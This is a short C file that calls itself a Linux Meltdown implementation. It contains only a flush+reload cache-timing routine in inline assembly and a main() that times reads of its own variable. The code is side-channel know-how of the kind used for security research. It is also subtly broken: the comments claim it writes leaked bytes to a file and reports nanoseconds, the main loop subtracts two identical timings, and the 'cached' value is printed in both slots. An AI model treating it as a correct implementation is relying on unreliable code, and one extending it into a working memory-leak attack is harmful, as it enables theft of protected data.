/**
 * Meltdown implementation for linux
 * based on work by Lipp et. all in https://meltdownattack.com/meltdown.pdf
 *
 * Mark Hill 2017
 */

#include<unistd.h>
#include<pthread.h>
#include<stdint.h>
#include<stdio.h>
#include<time.h>
#include <emmintrin.h>

volatile char *access_ptr;

uint64_t start;
volatile char a;
/**
 * returns the time in nanoseconds to read the memory at @ptr
 */
uint64_t time_to_read(volatile char *ptr) {
	volatile unsigned long time;

	asm __volatile__ (
		" mfence \n"
		" lfence \n"
		" rdtsc \n"
		" lfence \n"
		" movl %%eax, %%esi \n"
		" movl (%1), %%eax \n"
		" lfence \n"
		" rdtsc \n"
		" subl %%esi, %%eax \n"
		" clflush 0(%1) \n"
		: "=a" (time)
		: "c" (ptr)
		: "%esi", "%edx");

	return time;
}

void evict_ptr(volatile char *ptr) {
	asm __volatile__ ("clflush (%0)" : : "r" (ptr));
}

/**
 * uses flush+reload to read bytes and write them
 * 	to a file
 */
int main(int argc, char **argv) {
	volatile char c = 5;
	access_ptr = &c;

	long long diff_sum = 0;
	const unsigned int loop_iter = 100;
	for (int i = 0; i < loop_iter; i++) {
		a = *access_ptr;
		diff_sum += time_to_read(access_ptr) - time_to_read(access_ptr);
	}
	unsigned long long cached_avg_nsec = diff_sum / loop_iter;
/*
	time_sum = 0;
	for (int i = 0; i < loop_iter; i++) {
		time_sum += time_to_read(access_ptr);
	}
	unsigned long long uncached_avg_nsec = time_sum / loop_iter;
*/
	printf("cached: %llu\nuncached: %llu\n", cached_avg_nsec, cached_avg_nsec);

	return 0;
}
